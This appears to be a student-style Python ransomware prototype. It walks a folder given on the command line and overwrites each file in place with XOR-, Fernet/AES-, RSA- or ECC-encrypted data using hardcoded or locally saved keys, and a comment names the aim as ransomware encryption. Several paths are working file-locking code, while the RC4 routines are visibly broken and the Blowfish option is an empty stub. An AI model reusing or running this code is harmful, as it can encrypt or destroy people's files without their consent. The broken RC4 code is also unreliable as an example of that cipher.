#!/usr/bin/env python3

#imports
import random, base64
from hashlib import sha1
from pathlib import Path
import numpy
import sys
import os
import re
import binascii
import base64
from itertools import cycle
#additional imports
from cryptography.fernet import Fernet,InvalidToken
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from math import gcd as bltin_gcd
import gzip
from ecies.utils import generate_eth_key, generate_key
from ecies import encrypt, decrypt

#Step 1: 
#Scan dir presented to find all files located inside file.
xorKey = "FLS"
encoder = "latin_1"
AESkey = "oz_S22im8QEMyZxto-C_6J9HwIYOGc9rux4fh-si1So="
rc4textkey = "lv_17yvrgYdkWsjms5_oi-6_7gy="
sizeOfArray = 256
s = []
t = []


def encryptXor():
    for root, dirs, files in os.walk(sys.argv[1]):
        for file1 in files:        
            # data can be held in differnt formats which mean we have to account for them.
            data = open(os.path.join(root,file1),"rb+")
            dataValue = data.read()
            data.seek(0)
            value = bytes(list((x^ord(y)) for (x,y) in zip(dataValue,cycle(xorKey))))            
            data.write(value)
            data.truncate()
            data.close()
            
def decryptXor():
    for root, dirs, files in os.walk(sys.argv[1]):
        for file2 in files:
            data = open(os.path.join(root,file2),"rb+")
            dataValue = data.read()
            data.seek(0)
            value = bytes(list((x^ord(y)) for (x,y) in zip(dataValue,cycle(xorKey))))
            # value = ''.join(chr(ord(x)^ord(y)) for (x,y) in zip(str(dataValue), cycle(xorKey)))      
            data.write(value) #writes over the files <---- so we want to implement our ransomewear encryption here
            data.truncate()
            data.close
def encryptAES():
    for root, dirs, files in os.walk(sys.argv[1]):
        for file1 in files:
            data = open(os.path.join(root,file1),"rb+")
            data_value = data.read()
            data.seek(0)
            fernet = Fernet(AESkey)
            data.write(fernet.encrypt(data_value))
            data.truncate()
            data.close
def decryptAES():
    for root, dirs, files in os.walk(sys.argv[1]):
        for file2 in files: 
            data = open(os.path.join(root,file2),"rb+")
            data_value = data.read()
            data.seek(0)
            fernet = Fernet(AESkey)
            data.write(fernet.decrypt(data_value))  
            data.truncate()
            data.close()


def encrpytECC():
    secp_k = generate_key() #generate key pub priv
     #writing keys to secure file
    sk_byte = secp_k.secret
    pk_byte = secp_k.public_key.format(True)
    pub = open("pub.key","wb+")
    priv = open("priv.key","wb+")
    pub.write(pk_byte)
    priv.write(sk_byte)
    pub.close()
    priv.close()
    #reads file directory from root to leaf
    for root, dirs, files in os.walk(sys.argv[1]):
        for file1 in files:
            data = open(os.path.join(root,file1), "rb+")
            dataValue = data.read()
            #sets pointer to beginning of file 
            
            data.seek(0)

            #do encrpyt here

            encryptdata = encrypt(pk_byte,dataValue)

            data.write(encryptdata)
            data.truncate()
            data.close()

def decryptECC():
    #reads file directory from root to leaf
    for root, dirs, files in os.walk(sys.argv[1]):
        for file1 in files:
            data = open(os.path.join(root,file1), "rb+")
            dataValue = data.read()
 
            #sets pointer to beginning of file 
            print(dataValue)
            byteList=[]
            data.seek(0)

            #get sk 
            sk=open("priv.key","rb+")
            skVal = sk.read()
            #sk.close()

            print(skVal)
            decryptdata = decrypt(skVal,dataValue)
            
            data.write(decryptdata)
            data.truncate()
            data.close()

def rsaEnc():
    key = RSA.generate(2048).export_key()
    f = open('kRSA.key','wb+')
    f.write(key)
    f.close()
    key = RSA.import_key(open('kRSA.key').read())
    #print(key.export_key())
    for root, dirs, files in os.walk(sys.argv[1]):
        for file1 in files:     
            datafile = open(os.path.join(root,file1),"rb+")
            #print(len(datafile.read()))
            data = datafile.read(128)
            block = []
            
            while data:
                block.append(data)
                data = datafile.read(128)
            #print(len(block))
            moreblock = []
            
            #print(key)
            cipher = PKCS1_OAEP.new(key)
            #print(len(block))
            for i in block:
                ciphertext = cipher.encrypt(i)
                moreblock.append(ciphertext)
            
            
            datafile.seek(0)
            for i in moreblock:
                datafile.write(i)
            #print(datafile.read()) 
               
            datafile.truncate()
            #print(datafile.read()) 
            datafile.close()
            datafile = open(os.path.join(root,file1),"rb+")
            data = datafile.read()
            print(data)

def rsaDec():
    key = RSA.import_key(open('kRSA.key').read())
    for root, dirs, files in os.walk(sys.argv[1]):
        for file1 in files:     
            datafile = open(os.path.join(root,file1),"rb+")

            MAX_BYTES=256
                       
            data = datafile.read()
            print(data) 

            block = []
            
            while data:
                block.append(data)
                data = datafile.read(MAX_BYTES)
            #print(block)
            Plaintext = []
            cipher = PKCS1_OAEP.new(key)
            for cText in block:
                plain = cipher.decrypt(cText)
                Plaintext.append(plain)

              
            datafile.seek(0)
            for plaintext in Plaintext:
                datafile.write(plaintext)
                #datafile.write(ciphertext)
                
            datafile.truncate()
            datafile.close()

#KSA Algorithm
def KSA(key):
    i = 0
    j = 0
    for i in range(256):
        s[i] = i
        t[i] = key[i% len(key)]
    for i in range(0,256,1):
        j = (j + s[i] + t[i])%256
        temp = s[i]
        s[i] = s[j]
        s[j] = temp.bytes

def PRGA(inputlength):
    i,j,k,l = 0
    key = []
    for k in range(sizeOfArray):
        i = (i + 1) % sizeOfArray
        j = (j + s[i]) % sizeOfArray
        temp = s[i]
        s[i] = s[j]
        s[j] = temp
        l = (s[i]+s[j])
        key[k] = s[l]
    return key

def text_to_bytes():
    for root, dirs, files in os.walk(sys.argv[1]):
        for file1 in files: 
            byteList = []

            f = open(file1, 'r')
            s = f.read()
            f.close()

            # on Windows, default coding for Chinese is GBK
            # s = s.decode('gbk').encode('utf-8')
            for byte in s:
                byteList.append(ord(byte))
    return byteList
#set key array

def prep_key_array(s):
    return [ord(c) for c in s]


#implement RC4 algorith using the given data and key
#This would also require an XOR operation on every byte

def crypt(data, key):
    x = 0
    box = list(range(256))
    #box = len(allocations)
    for i in box:
        x = (x + box[i] + ord(key[i % len(key)])) % 256
        box[i], box[x] = box[x], box[i]
    x = y = 0
    out = []
    for char in data:
        x = (x + 1) % 256
        y = (y + box[x]) % 256
        box[x], box[y] = box[y], box[x]
        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))
    return ''.join(out)
   
def encryptAA( key):
    for root, dirs, files in os.walk(sys.argv[1]):
        for file1 in files:
            KSA(key)
            text = [file1.text_to_bytes]
            k = PRGA(len(text))
            answer = []
            a,b = 0
            for i in range(len(text)):
                a = text[i].bytes
                b = k[i] ** a
                answer[i] = b.bytes
    return answer
def decryptAA(key):
    for root, dirs, files in os.walk(sys.argv[1]):
        for file2 in files:
            KSA(key)
            text = [file2.text_to_bytes]
            k = PRGA(len(text))
            answer = []
            a,b = 0
            for i in range(len(text)):
                a = text[i].bytes
                b = k[i] ** a
                answer[i] = b.bytes
    return answer
def encryptRC4():
    for root, dirs, files in os.walk(sys.argv[1]):
        for file1 in files:
            data = open(os.path.join(root,file1),"rb+")
            #data_value = data.read()
            data.seek(0)
            data.write(encryptAA(rc4textkey))
            data.truncate()
            data.close
def decryptRC4():
    for root, dirs, files in os.walk(sys.argv[1]):
        for file2 in files: 
            data = open(os.path.join(root,file2),"rb+")
            #data_value = data.read()
            data.seek(0)
            data.write(decryptAA(rc4textkey))  
            data.truncate()
            data.close()
    		     		              		            		              


def main():
    if len(sys.argv) <= 1 :
        print("folder expected")
    else:
        if len(sys.argv) <= 2 :
            print("put type of algorithm")
        else:
            if sys.argv[2] == "sym":
                if len(sys.argv) <= 3 :
                    print("put algorithm")
                else:
                    if sys.argv[3] == "XOR" or sys.argv[3] == "xor" or sys.argv[3] == "Xor":
                        if len(sys.argv) <= 4 :
                            print("put encrypt or decrypt")
                        else:
                            if sys.argv[4] == "encrypt":
                                encryptXor()
                                #print(holder)
                                print("DONE ENCRYPTION")
                            elif sys.argv[4] == "decrypt":
                                decryptXor()
                                print("DONE Decryption")
                                #print(holder)
                    elif sys.argv[3] == "AES" or sys.argv[3] == "aes" or sys.argv[3] == "Aes":
                        if len(sys.argv) <= 4 :
                            print("put encrypt or decrypt")
                        else:
                            if sys.argv[4] == "encrypt":
                                encryptAES()
                                #print(holder)
                                print("DONE ENCRYPTION")
                            elif sys.argv[4] == "decrypt":
                                decryptAES()
                                print("DONE Decryption")
                                #print(holder)
                    elif sys.argv[3] == "RC4" or sys.argv[3] == "rc4" or sys.argv[3] == "Rc4":
                        if len(sys.argv) <= 4 :
                            print("put encrypt or decrypt")
                        else:
                            if sys.argv[4] == "encrypt":
                                #data = ""
                                #rc4key = "lv_17yvrgYdkWsjms5_oi-6_7gy="
                                encryptRC4()
                    	         
                                #print(holder)
                                print("DONE ENCRYPTION")
                            elif sys.argv[4] == "decrypt":
                                decryptRC4()
                                print("DONE Decryption")
                                #print(holder)
                    elif sys.argv[3] == "BLOWFISH" or sys.argv[3] == "blowfish" or sys.argv[3] == "Blowfish":
                        if len(sys.argv) <= 4 :
                            print("put encrypt or decrypt")
                        else:
                            if sys.argv[4] == "encrypt":
                                #encryptBlowfish()
                                #print(holder)
                                print("DONE ENCRYPTION")
                            elif sys.argv[4] == "decrypt":
                                #decryptBlowfish()
                                print("DONE Decryption")
                                #print(holder)
            elif sys.argv[2] == "asym":
                if len(sys.argv) <= 3 :
                    print("put algorithm")
                else:
                    if sys.argv[3] == "rsa" or sys.argv[3] == "RSA" or sys.argv[3] == "Rsa":
                        if len(sys.argv) <= 4 :
                            print("put encrypt or decrypt")
                        else:
                            if sys.argv[4] == "encrypt":
                                rsaEnc()
                                
                                print("DONE ENCRYPTION")
                            elif sys.argv[4] == "decrypt":
                                rsaDec()
                                print("DONE Decryption")
                                
                    elif sys.argv[3] == "ECC" or sys.argv[3] == "ecc" or sys.argv[3] == "Ecc":
                        if len(sys.argv) <= 4 :
                            print("put encrypt or decrypt")
                        else:
                            if sys.argv[4] == "encrypt":
                                encrpytECC()
                                #print(holder)
                                print("DONE ENCRYPTION")
                            elif sys.argv[4] == "decrypt":
                                decryptECC()
                                print("DONE Decryption")
                                #print(holder)


if __name__ == "__main__":
    # execute only if run as a script
    print("TO RUN TYPE python3 'foldername' 'asym or sym' 'ecc or rsa' 'decrypt or encrypt' with out the ' \n")
    print(" ALSO TO MAKE SURE TO INSTALL THE CORRECT PACKAGES!!! \n")
    main()